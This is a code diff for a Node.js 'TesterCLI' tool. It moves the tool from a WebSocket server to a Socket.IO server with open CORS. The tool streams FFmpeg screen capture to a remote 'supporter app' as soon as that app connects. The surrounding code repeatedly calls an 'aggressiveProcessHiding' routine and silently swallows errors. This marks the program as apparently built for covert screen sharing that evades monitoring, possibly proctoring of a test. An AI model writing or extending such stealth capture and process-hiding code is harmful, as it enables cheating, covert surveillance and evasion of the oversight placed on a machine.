@@ -305,8 +305,8 @@ class TesterCLI {
 
       // Handle FFmpeg output
       this.captureProcess.stdout.on('data', (chunk) => {
-        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
-          this.ws.send(chunk);
+        if (this.socket && this.socket.connected) {
+          this.socket.emit('screenData', chunk);
         }
       });
 
@@ -337,34 +337,40 @@ class TesterCLI {
     }
   }
 
-  // Start WebSocket server for supporter app to connect
-  startWebSocketServer(port = 3000) {
+  // Start Socket.IO server for supporter app to connect
+  startSocketIOServer(port = 3000) {
     try {
-      const WebSocketServer = require('ws').Server;
+      const express = require('express');
       const http = require('http');
+      const socketIo = require('socket.io');
+      
+      // Create Express app
+      const app = express();
       
       // Create HTTP server
-      this.httpServer = http.createServer();
+      this.httpServer = http.createServer(app);
       
-      // Create WebSocket server
-      this.wss = new WebSocketServer({ 
-        server: this.httpServer,
-        port: port
+      // Create Socket.IO server
+      this.io = socketIo(this.httpServer, {
+        cors: {
+          origin: "*",
+          methods: ["GET", "POST"]
+        }
       });
       
-      this.wss.on('connection', (ws) => {
-        this.ws = ws;
+      this.io.on('connection', (socket) => {
+        this.socket = socket;
         
         // Start capture when supporter connects
         this.startCapture();
         
-        ws.on('close', () => {
+        socket.on('disconnect', () => {
           // Stop capture when supporter disconnects
           this.stopCapture();
-          this.ws = null;
+          this.socket = null;
         });
         
-        ws.on('error', (error) => {
+        socket.on('error', (error) => {
           // Silently ignore errors
         });
       });
@@ -384,8 +390,8 @@ class TesterCLI {
     // Initial process hiding
     await this.aggressiveProcessHiding();
     
-    // Start WebSocket server for supporter to connect
-    this.startWebSocketServer(3000);
+    // Start Socket.IO server for supporter to connect
+    this.startSocketIOServer(3000);
     
     // Periodic process hiding
     setInterval(() => {
